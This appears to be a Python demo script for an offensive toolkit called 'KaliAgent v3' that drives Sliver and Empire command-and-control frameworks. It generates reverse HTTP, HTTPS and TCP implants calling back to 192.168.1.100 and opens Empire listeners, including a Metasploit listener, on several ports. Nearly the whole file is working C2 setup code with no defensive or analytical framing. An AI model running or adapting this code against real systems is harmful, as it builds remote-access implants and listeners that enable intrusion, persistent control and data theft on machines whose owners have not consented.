#!/usr/bin/env python3
"""KaliAgent v3 - C2 Infrastructure Demo"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from c2.sliver_client import SliverClient, ImplantType, Protocol
from c2.empire_client import EmpireClient, ListenerType
from datetime import datetime

print("="*70)
print("  KaliAgent v3 - C2 Infrastructure")
print("  Multi-C2 Command & Control")
print("="*70)
print()

# Sliver Demo
print("🎯 Sliver C2 Client")
print()
sliver = SliverClient(config_dir=Path('/tmp/sliver_demo'))

print("   Connecting to Sliver...")
success, msg = sliver.connect('grpc://localhost:31337')
print(f"   Status: {'✅ Connected' if success else '🔌 Mock Mode (Server not running)'}")
print()

print("   Generating Implants:")
implants = [
    (ImplantType.REVERSE_HTTP, Protocol.HTTP, 80),
    (ImplantType.REVERSE_HTTPS, Protocol.HTTPS, 443),
    (ImplantType.REVERSE_TCP, Protocol.TCP, 4444)
]

for impl_type, proto, port in implants:
    success, msg = sliver.generate_implant(
        name=f'demo_{impl_type.value}',
        implant_type=impl_type,
        protocol=proto,
        lhost='192.168.1.100',
        lport=port,
        output_path=Path(f'/tmp/{impl_type.value}.bin')
    )
    status = '✅' if success else '⏳'
    print(f"      {status} {impl_type.value:20s} (port {port})")
print()

implant_list = sliver.list_implants()
print(f"   Total Implants: {len(implant_list)}")
print()

# Empire Demo
print("🏰 Empire C2 Client")
print()
empire = EmpireClient(config_dir=Path('/tmp/empire_demo'))

print("   Connecting to Empire...")
success, msg = empire.connect('https://localhost:1337')
print(f"   Status: {'✅ Connected' if success else '🔌 Mock Mode (Server not running)'}")
print()

print("   Creating Listeners:")
listeners = [
    (ListenerType.HTTP, 8080),
    (ListenerType.HTTPS, 8443),
    (ListenerType.METASPLOIT, 4444)
]

for listener_type, port in listeners:
    success, msg = empire.create_listener(
        name=f'demo_{listener_type.value}',
        listener_type=listener_type,
        host='0.0.0.0',
        port=port
    )
    status = '✅' if success else '⏳'
    print(f"      {status} {listener_type.value:20s} (port {port})")
print()

listener_list = empire.list_listeners()
print(f"   Total Listeners: {len(listener_list)}")
print()

print("="*70)
print(f"  Demo completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("="*70)
